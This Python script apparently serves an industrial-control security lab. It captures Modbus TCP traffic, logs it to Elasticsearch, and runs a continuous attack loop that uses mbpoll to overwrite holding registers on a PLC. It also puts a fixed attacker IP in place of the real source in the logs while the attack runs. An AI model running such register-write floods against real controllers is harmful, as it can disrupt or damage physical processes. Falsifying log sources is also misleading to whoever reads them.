import json
import requests
import time
import subprocess
import threading
import re
from datetime import datetime, timezone
from scapy.all import sniff, TCP, IP

# --- CONFIGURATION ---
ES_URL = "http://localhost:9200"
KIBANA_URL = "http://localhost:5601"
INDEX_NAME = "nexus-ot-traffic-000001"
PLC_IP = "192.168.1.223"
NETWORK_NAME = "backend_nexus_net"

# 🔥 ATTACK CONTROL
ATTACK_ACTIVE = False
ATTACK_SOURCE_IP = "192.168.1.146"

# -----------------------------
# INTERFACE DETECTION
# -----------------------------
def get_dynamic_interface(network_name):
    print(f"🔍 Searching for Docker bridge associated with '{network_name}'...")
    try:
        result = subprocess.run(
            ["docker", "network", "inspect", network_name, "-f", "{{.Id}}"],
            capture_output=True, text=True, check=True
        )
        net_id = result.stdout.strip()[:12]
        iface = f"br-{net_id}"

        check = subprocess.run(["ip", "link", "show", iface], capture_output=True, text=True)
        if check.returncode == 0:
            print(f"✅ Found active bridge: {iface}")
            return iface
    except Exception:
        pass

    try:
        print("⚠️ Fallback interface detection...")
        result = subprocess.run(["ip", "-o", "link", "show"], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if "br-" in line and "UP" in line:
                match = re.search(r'(br-[a-z0-9]+):', line)
                if match:
                    iface = match.group(1)
                    print(f"✅ Using fallback bridge: {iface}")
                    return iface
    except Exception as e:
        print(f"❌ Fallback failed: {e}")

    return None

# -----------------------------
# ELK SETUP
# -----------------------------
def setup_elk():
    print(f"🛠️ Initializing ELK Stack...")

    mappings = {
        "mappings": {
            "properties": {
                "@timestamp": {"type": "date"},
                "source": {"properties": {"ip": {"type": "ip"}}},
                "destination": {"properties": {"ip": {"type": "ip"}, "port": {"type": "integer"}}},
                "network": {
                    "properties": {
                        "protocol": {"type": "keyword"},
                        "transport": {"type": "keyword"},
                        "bytes": {"type": "long"}
                    }
                },
                "event": {
                    "properties": {
                        "action": {"type": "keyword"},
                        "severity": {"type": "keyword"}
                    }
                }
            }
        }
    }

    try:
        res = requests.get(f"{ES_URL}/{INDEX_NAME}", timeout=2)
        if res.status_code == 404:
            print(f"📦 Creating Index: {INDEX_NAME}")
            requests.put(f"{ES_URL}/{INDEX_NAME}", json=mappings)
        else:
            print(f"✅ Index exists.")
    except Exception as e:
        print(f"❌ ES error: {e}")

# -----------------------------
# PACKET HANDLER
# -----------------------------
def handle_packet(pkt):
    global ATTACK_ACTIVE

    if IP in pkt and TCP in pkt:
        if pkt[TCP].sport == 502 or pkt[TCP].dport == 502:

            now = datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")

            real_src_ip = pkt[IP].src
            dst_ip = pkt[IP].dst
            payload_bytes = len(pkt[TCP].payload)

            if ATTACK_ACTIVE:
                src_ip = ATTACK_SOURCE_IP
                severity = "critical"
            else:
                src_ip = real_src_ip
                severity = "info"

            print(f"📡 {src_ip} -> {dst_ip} | {payload_bytes} bytes")

            if real_src_ip == PLC_IP:
                action, msg = "plc_telemetry_out", "PLC response"
            else:
                action, msg = "hmi_request_in", "HMI command"

            log_entry = {
                "@timestamp": now,
                "source": {"ip": src_ip},
                "destination": {"ip": dst_ip, "port": 502},
                "network": {
                    "protocol": "modbus",
                    "transport": "tcp",
                    "bytes": payload_bytes
                },
                "event": {
                    "action": action,
                    "severity": severity
                },
                "message": msg
            }

            try:
                requests.post(f"{ES_URL}/{INDEX_NAME}/_doc", json=log_entry, timeout=0.1)
            except:
                pass

# -----------------------------
# 🔥 CONTINUOUS ATTACK FUNCTION
# -----------------------------
def backup_mbpoll_attack(target_ip):
    global ATTACK_ACTIVE

    input("\n" + "="*60 + f"\n🎯 PRESS [ENTER] TO LAUNCH CONTINUOUS ATTACK ON {target_ip}\n" + "="*60 + "\n")

    ATTACK_ACTIVE = True
    print(f"\n🔥 CONTINUOUS ATTACK ACTIVE from {ATTACK_SOURCE_IP} → {target_ip}")
    print("🛑 Press CTRL+C to stop...\n")

    try:
        while True:  # 🔥 infinite loop
            subprocess.Popen(["mbpoll", "-m", "tcp", "-a", "1", "-t", "4", "-r", "100", "-1", target_ip, "9999"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.Popen(["mbpoll", "-m", "tcp", "-a", "1", "-t", "4", "-r", "101", "-1", target_ip, "9999"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            subprocess.Popen(["mbpoll", "-m", "tcp", "-a", "1", "-t", "4", "-r", "102", "-1", target_ip, "0"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.Popen(["mbpoll", "-m", "tcp", "-a", "1", "-t", "4", "-r", "103", "-1", target_ip, "0"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            subprocess.Popen(["mbpoll", "-m", "tcp", "-a", "1", "-t", "4", "-r", "104", "-1", target_ip, "5000"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.Popen(["mbpoll", "-m", "tcp", "-a", "1", "-t", "4", "-r", "105", "-1", target_ip, "5000"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            time.sleep(0.2)

    except KeyboardInterrupt:
        print("\n🛑 Attack manually stopped.")

    finally:
        ATTACK_ACTIVE = False
        print("✅ Attack flag reset.")

# -----------------------------
# MAIN
# -----------------------------
if __name__ == "__main__":
    setup_elk()

    DOCKER_IFACE = get_dynamic_interface(NETWORK_NAME)
    if not DOCKER_IFACE:
        print("❌ Could not find Docker interface.")
        exit(1)

    attack_thread = threading.Thread(target=backup_mbpoll_attack, args=(PLC_IP,))
    attack_thread.daemon = True
    attack_thread.start()

    print(f"\n🕵️ Monitoring interface: {DOCKER_IFACE}\n")

    try:
        sniff(iface=DOCKER_IFACE, filter="tcp port 502", prn=handle_packet, store=0)
    except PermissionError:
        print("❌ Run with sudo")
